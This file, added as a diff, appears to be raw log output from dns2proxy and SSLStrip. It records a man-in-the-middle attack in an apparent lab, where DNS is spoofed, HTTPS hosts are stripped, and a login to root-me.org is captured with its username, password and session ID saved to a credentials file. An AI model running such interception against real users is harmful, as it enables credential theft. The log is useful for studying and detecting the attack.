@@ -1,0 +1,102 @@
+INFO:dns2proxy:1 questions.
+INFO:dns2proxy:q name = webfacebook.com
+INFO:dns2proxy:Query = webfacebook.com A
+INFO:dns2proxy:Adding real IP  = 50.63.202.61
+INFO:dns2proxy:waiting requests.
+INFO:dns2proxy:serving a request.
+INFO:dns2proxy:Client IP: 10.0.0.20
+INFO:dns2proxy:request is webtwitter.com. IN A
+INFO:dns2proxy:1 questions.
+INFO:dns2proxy:q name = webtwitter.com
+INFO:dns2proxy:Query = webtwitter.com A
+INFO:dns2proxy:Adding real IP  = 66.96.149.32
+INFO:dns2proxy:waiting requests.
+INFO:dns2proxy:serving a request.
+INFO:dns2proxy:Client IP: 10.0.0.20
+INFO:dns2proxy:request is www.root-me.pro. IN A
+INFO:dns2proxy:1 questions.
+INFO:dns2proxy:q name = www.root-me.pro
+INFO:dns2proxy:Query = www.root-me.pro A
+INFO:dns2proxy:Adding real IP  = 213.186.33.50
+INFO:dns2proxy:waiting requests.
+INFO:dns2proxy:serving a request.
+INFO:dns2proxy:Client IP: 10.0.0.20
+INFO:dns2proxy:request is wwww.linkedin.com. IN A
+INFO:dns2proxy:1 questions.
+INFO:dns2proxy:q name = wwww.linkedin.com
+INFO:dns2proxy:Query = wwww.linkedin.com A
+INFO:dns2proxy:SSLStrip transforming host: wwww.linkedin.com => www.linkedin.com ...
+INFO:dns2proxy:Query = www.linkedin.com A
+INFO:dns2proxy:Adding real IP  = 185.63.147.10
+INFO:dns2proxy:waiting requests.
+2016-06-13 18:18:16,553 : [10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L150xH150/rwhiteGrand-048ea.png?1465816508
+[10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L150xH150/rwhiteGrand-048ea.png?1465816508
+2016-06-13 18:18:16,886 : [10.0.0.20] GET wwww.root-me.org/local/cache-js/f40ff5c95402023c8ac0331b68995251.js?1465816480
+[10.0.0.20] GET wwww.root-me.org/local/cache-js/f40ff5c95402023c8ac0331b68995251.js?1465816480
+2016-06-13 18:18:17,019 : [10.0.0.20] GET wwww.root-me.org/local/cache-js/f40ff5c95402023c8ac0331b68995251.js?1465816480
+[10.0.0.20] GET wwww.root-me.org/local/cache-js/f40ff5c95402023c8ac0331b68995251.js?1465816480
+2016-06-13 18:18:21,314 : [10.0.0.20] GET wwww.root-me.org/spip.php?page=login&lang=fr
+[10.0.0.20] GET wwww.root-me.org/spip.php?page=login&lang=fr
+2016-06-13 18:18:21,725 : [10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L48xH48/rwhiteGrand48-a88ba.png?1465816480
+[10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L48xH48/rwhiteGrand48-a88ba.png?1465816480
+INFO:dns2proxy:serving a request.
+INFO:dns2proxy:Client IP: 10.0.0.20
+INFO:dns2proxy:request is wwww.navixia.com. IN A
+INFO:dns2proxy:1 questions.
+INFO:dns2proxy:q name = wwww.navixia.com
+INFO:dns2proxy:Query = wwww.navixia.com A
+2016-06-13 18:18:21,874 : [10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon188-9853c.png?1465816480
+[10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon188-9853c.png?1465816480
+INFO:dns2proxy:SSLStrip transforming host: wwww.navixia.com => www.navixia.com ...
+INFO:dns2proxy:Query = www.navixia.com A
+2016-06-13 18:18:21,941 : [10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon5-fd988.png?1465816480
+[10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon5-fd988.png?1465816480
+INFO:dns2proxy:Adding real IP  = 94.103.98.25
+INFO:dns2proxy:waiting requests.
+2016-06-13 18:18:22,074 : [10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon19-95010.png?1465816480
+[10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon19-95010.png?1465816480
+2016-06-13 18:18:22,083 : [10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon1-d2632.png?1465816480
+[10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon1-d2632.png?1465816480
+2016-06-13 18:18:22,105 : [10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon106-4f00e.png?1465816480
+[10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon106-4f00e.png?1465816480
+2016-06-13 18:18:22,259 : [10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon6-82984.png?1465816480
+[10.0.0.20] GET wwww.root-me.org/local/cache-vignettes/L16xH16/rubon6-82984.png?1465816480
+2016-06-13 18:18:30,245 : [10.0.0.20] GET wwww.root-me.org/spip.php?page=informer_auteur&var_login=ujjjjjjj&var_compteur=1465834705078
+[10.0.0.20] GET wwww.root-me.org/spip.php?page=informer_auteur&var_login=ujjjjjjj&var_compteur=1465834705078
+2016-06-13 18:18:33,658 : [10.0.0.20] POST wwww.root-me.org/spip.php?page=login&lang=fr
+[10.0.0.20] POST wwww.root-me.org/spip.php?page=login&lang=fr
+[*] Capture Salved on: Logs/credentials.txt
+[10.0.0.20:37755 > 212.129.28.16:80] WARNING:root:SECURE POST Data (www.root-me.org):
+var_ajax=form&page=login&lang=fr&formulaire_action=login&formulaire_action_args=UezOWOeKOXB%2F4EB%2FokuovGWtktH4uj7TMryaHTwjU43aMv6wjdJLJG9alkIZKgzG7AP0rf%2FahYNdIAdGeuRruzNyj7%2FeHSo9DXrMEnbt4wrTDxLG04bHDMVE2H%2FzaZyVrKzMDoS%2BoZ%2BJX5X1&var_login=ujjjjjjj&password=jhjhjjhkhg
+HTTP username: login=ujjjjjjj
+2016-06-13 18:18:33,703 : [10.0.0.20:37755 > 212.129.28.16:80] HTTP username: login=ujjjjjjj
+[*] Capture Salved on: Logs/credentials.txt
+[10.0.0.20:37755 > 212.129.28.16:80] HTTP password: password=jhjhjjhkhg
+2016-06-13 18:18:33,703 : [10.0.0.20:37755 > 212.129.28.16:80] HTTP password: password=jhjhjjhkhg
+2016-06-13 18:18:33,703 : [10.0.0.20] POST load: var_ajax=form&page=login&lang=fr&formulaire_action=login&formulaire_action_args=UezOWOeKOXB%2F4EB%2...
+[10.0.0.20] POST load: var_ajax=form&page=login&lang=fr&formulaire_action=login&formulaire_action_args=UezOWOeKOXB%2F4EB%2...
+2016-06-13 18:18:33,851 : [10.0.0.20] POST wwww.root-me.org/spip.php?page=login&lang=fr
+[10.0.0.20] POST wwww.root-me.org/spip.php?page=login&lang=fr
+[*] Capture Salved on: Logs/credentials.txt
+[10.0.0.20:37755 > 212.129.28.16:80] HTTP username: ID=orkg7j4qvhiv20u84868s2kgu2
+
+var_ajax=form
+2016-06-13 18:18:33,852 : [10.0.0.20:37755 > 212.129.28.16:80] HTTP username: ID=orkg7j4qvhiv20u84868s2kgu2
+
+var_ajax=form
+[*] Capture Salved on: Logs/credentials.txt
+[10.0.0.20:37755 > 212.129.28.16:80] HTTP password: password=jhjhjjhkhgPOST /spip.php?page=login
+2016-06-13 18:18:33,853 : [10.0.0.20:37755 > 212.129.28.16:80] HTTP password: password=jhjhjjhkhgPOST /spip.php?page=login
+2016-06-13 18:18:33,853 : [10.0.0.20] POST load: var_ajax=form&page=login&lang=fr&formulaire_action=login&formulaire_action_args=UezOWOeKOXB%2F4EB%2...
+[10.0.0.20] POST load: var_ajax=form&page=login&lang=fr&formulaire_action=login&formulaire_action_args=UezOWOeKOXB%2F4EB%2...
+2016-06-13 18:18:34,664 : [10.0.0.20] POST wwww.root-me.org/spip.php?page=login&lang=fr
+[10.0.0.20] POST wwww.root-me.org/spip.php?page=login&lang=fr
+2016-06-13 18:18:34,664 : [10.0.0.20] POST load: var_ajax=form&page=login&lang=fr&formulaire_action=login&formulaire_action_args=UezOWOeKOXB%2F4EB%2...
+[10.0.0.20] POST load: var_ajax=form&page=login&lang=fr&formulaire_action=login&formulaire_action_args=UezOWOeKOXB%2F4EB%2...
+WARNING:root:SECURE POST Data (www.root-me.org):
+var_ajax=form&page=login&lang=fr&formulaire_action=login&formulaire_action_args=UezOWOeKOXB%2F4EB%2FokuovGWtktH4uj7TMryaHTwjU43aMv6wjdJLJG9alkIZKgzG7AP0rf%2FahYNdIAdGeuRruzNyj7%2FeHSo9DXrMEnbt4wrTDxLG04bHDMVE2H%2FzaZyVrKzMDoS%2BoZ%2BJX5X1&var_login=ujjjjjjj&password=
+
+
+myLogProbeScan.write("DNS-SSLStrip:%s#%s\n" % (host, host2))
+myLogProbeScan.write("DNS-Request:%s#%s\n" % (clientIP, request))
+myLogProbeScan.write("DNS-Query:%s#\n" % (name, type))
